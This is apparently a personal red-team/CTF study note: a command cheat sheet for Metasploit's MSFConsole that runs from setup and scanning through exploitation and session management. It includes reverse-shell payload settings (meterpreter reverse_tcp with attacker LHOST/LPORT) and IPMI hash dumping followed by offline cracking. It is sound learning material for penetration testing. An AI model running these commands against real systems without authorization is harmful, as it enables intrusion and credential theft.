Tags: #Status/In-Progress #Type/Tool #Context/Linux #Context/Redteam

---
## Overview
MSFConsole is the primary interface for the Metasploit Framework. It provides an interactive command-line environment for loading modules, configuring parameters, running scans, launching exploits, and managing active sessions. All framework functionality is accessible through MSFConsole. This note follows the logical CTF workflow from first launch through active session management.

## Target / Context
Used during the enumeration, exploitation, and post-exploitation phases of any engagement. Part of [[Metasploit]] — see that note for module types and payload reference.

---
## Installation

> [!INFO]- Installation Commands:
> MSFConsole is installed as part of Metasploit Framework:
> `sudo apt install metasploit-framework`
>
> Initialize the database on first use:
> `systemctl start postgresql`
> `msfdb init`

---
## Basic Usage

> [!INFO]- Basic Usage:
> `msfconsole`
> Verify database connection after launch:
> `db_status`

---
## Flags & Options

> [!INFO]- Flags & Options:
> | Flag | Description | Example |
> |------|-------------|---------|
> | `-q` | Quiet mode — suppress banner on launch | `msfconsole -q` |
> | `-r <file>` | Run a resource script on startup | `msfconsole -r setup.rc` |

---
## Common Use Cases

### Step 1 — Database Setup
Run once before starting work. The database stores scan results, hosts, and services across sessions.

> [!INFO]- Commands:
> `systemctl start postgresql`
> `msfdb init`
> `msfconsole`
> `db_status`
>
> Create a workspace to keep engagement data organized:
> `workspace -a <name>`
> `workspace` — list all workspaces
> `workspace <name>` — switch to a workspace
> `workspace -h` — show workspace help

---

### Step 2 — Navigation
Finding and loading modules.

> [!INFO]- Commands:
> `help` — show all available commands
> `history` — show command history
> `search <term>` — search modules by keyword
> `search type:auxiliary telnet` — filter by module type and keyword
> `search cve:2017-0144` — search by CVE number
> `use <module path>` — load a module by full path
> `use <number>` — load a module by search result number
> `info` — show full details about the loaded module
> `show options` — display all configurable parameters for the module
> `show payloads` — list compatible payloads for the current exploit
> `back` — unload current module and return to root prompt

---

### Step 3 — Setting Parameters
Configure the module before running it.

> [!INFO]- Commands:
> `set RHOSTS 10.10.10.1` — set target IP
> `set RHOSTS 10.10.10.0/24` — set target subnet
> `set RHOSTS file:/path/to/targets.txt` — load targets from file
> `set RPORT 445` — set target port
> `set PAYLOAD windows/x64/meterpreter/reverse_tcp` — set payload
> `set payload <number>` — set payload by number from `show payloads`
> `set LHOST 10.10.10.5` — set attacker IP
> `set LPORT 4444` — set attacker listening port
> `set SESSION 1` — set session for post-exploitation modules
> `setg RHOSTS 10.10.10.1` — set globally across all modules
> `unset <parameter>` — clear a single parameter
> `unset all` — clear all parameters for the current module
> `unsetg <parameter>` — clear a global parameter
> `show options` — verify all parameters are set correctly before running
>
> Note: Parameters reset when switching modules. Use `setg` to persist values globally.

---

### Step 4 — Scanning
Discover hosts, open ports, and services using auxiliary modules before exploiting.

> [!INFO]- Commands:
> `search portscan` — find available port scan modules
> `use auxiliary/scanner/portscan/tcp`
> `set RHOSTS 10.10.10.0/24`
> `set PORTS 1-1000`
> `set THREADS 10`
> `run`
>
> UDP sweep:
> `use auxiliary/scanner/discovery/udp_sweep`
>
> SMB enumeration:
> `use auxiliary/scanner/smb/smb_enumshares`
> `use auxiliary/scanner/smb/smb_version`
> `use auxiliary/scanner/smb/smb_login`
>
> MSSQL discovery:
> `use auxiliary/scanner/mssql/mssql_ping`
>
> IPMI version and hash dumping:
> `use auxiliary/scanner/ipmi/ipmi_version`
> `use auxiliary/scanner/ipmi/ipmi_dumphashes`
> `set OUTPUT_JOHN_FILE ipmi.john`
> `run`
> — Exploits the RAKP flaw: the server returns a password hash for any valid username; crack offline with Hashcat (-m 7300) or JohnTheRipper (--format=rakp)
>
> You can also run Nmap directly from within MSFConsole:
> `db_nmap -sV 10.10.10.1`
> Results are automatically stored in the database.

---

### Step 5 — Database Workflow
Use the database to manage discovered hosts and services and feed them directly into modules.

> [!INFO]- Commands:
> `hosts` — list all discovered hosts
> `hosts -R` — set RHOSTS to all hosts in the database
> `hosts -h` — show hosts command help
> `services` — list all discovered services
> `services -S <name>` — filter services by name (e.g., `services -S smb`)
> `services -h` — show services command help
>
> Efficient workflow:
> `db_nmap -sV 10.10.10.0/24` → review hosts → `use` vulnerability module → `hosts -R` → `exploit`

---

### Step 6 — Running Exploits
Launch the configured module against the target.

> [!INFO]- Commands:
> `exploit` — run the exploit and wait for a session
> `run` — alias for exploit
> `exploit -z` — run exploit and immediately background any resulting session
> `check` — test whether the target is vulnerable without exploiting (supported modules only)
>
> If the exploit succeeds, a session opens automatically.

---

### Step 7 — Session Management
Manage multiple active sessions after exploitation.

> [!INFO]- Commands:
> `background` — send active session to background (also `CTRL+Z` from Meterpreter)
> `sessions` — list all active sessions
> `sessions -i <number>` — interact with a specific session
> `sessions -k <number>` — kill a session
>
> After interacting with a session, see [[Meterpreter]] for post-exploitation commands.

---

### Jobs
Run an exploit as a background job to keep the prompt free for other work, or to manage multiple exploit listeners simultaneously.

> [!INFO]- Commands:
> `exploit -j` — run the current exploit as a background job instead of blocking the console
> `jobs -l` — list all active background jobs
> `jobs -K` — kill all running jobs
> `kill <number>` — kill a specific job by number
> `jobs -h` — show job command help
>
> Jobs are distinct from sessions: a job is an active listener or running module in the background, not yet an established session. Once the target connects, the job becomes a session.

---

### Plugins
Plugins extend MSFConsole with third-party tool integrations and automation utilities. They interact directly with the Metasploit API and add new commands to the console after loading.

> [!INFO]- Commands:
> Check installed plugins:
> `ls /usr/share/metasploit-framework/plugins`
>
> Load a plugin:
> `load <name>` — e.g., `load nessus`
> After loading, run `help` to see the new commands added by the plugin.
>
> Install a new plugin manually (example — Darkoperator's plugin set):
> `git clone https://github.com/darkoperator/Metasploit-Plugins`
> `sudo cp ./Metasploit-Plugins/pentest.rb /usr/share/metasploit-framework/plugins/pentest.rb`
> Then from within MSFConsole: `load pentest`
>
> Popular third-party plugins not pre-installed:
> Railgun (Windows post-exploitation via WinAPI): https://github.com/rapid7/metasploit-framework/wiki/How-to-use-Railgun-for-Windows-post-exploitation
> Darkoperator's plugin collection: https://github.com/darkoperator/Metasploit-Plugins

---

### Writing & Importing Modules
Custom or community-written `.rb` exploit modules can be imported into Metasploit without a full framework update. Only `.rb` files can be loaded — Metasploit modules are Ruby.

> [!INFO]- Commands:
> Search ExploitDB for Metasploit-tagged exploits from the CLI:
> `searchsploit <keyword>`
> Filter results to the "Metasploit Framework" tag to find `.rb` files ready for import.
>
> Copy a downloaded module into the framework:
> `cp ~/Downloads/exploit.rb /usr/share/metasploit-framework/modules/exploits/<os>/<service>/exploit_name.rb`
>
> Naming convention: snake_case, alphanumeric and underscores only — no dashes.
> Example: `nagios3_command_injection.rb`
>
> Load an additional module directory at startup:
> `msfconsole -m /path/to/modules/`
>
> Load an additional path from within MSFConsole:
> `loadpath /usr/share/metasploit-framework/modules/`
> `reload_all` — force-reload all modules from all known paths
>
> Modules merged into the official `metasploit-framework` GitHub branch are auto-imported when the framework is updated via `apt`.

---
## Related Techniques
-

## Related Playbooks
- [[Red Team]]

---
## References / Images
- Metasploit Framework Docs: https://adfoster-r7.github.io/metasploit-framework/
- Metasploit Unleashed: https://www.offsec.com/metasploit-unleashed/
- Metasploit Module Development Guide: https://www.rapid7.com/blog/post/2012/07/05/part-1-metasploit-module-development-the-series/
- The Metasploit Book: https://nostarch.com/metasploit
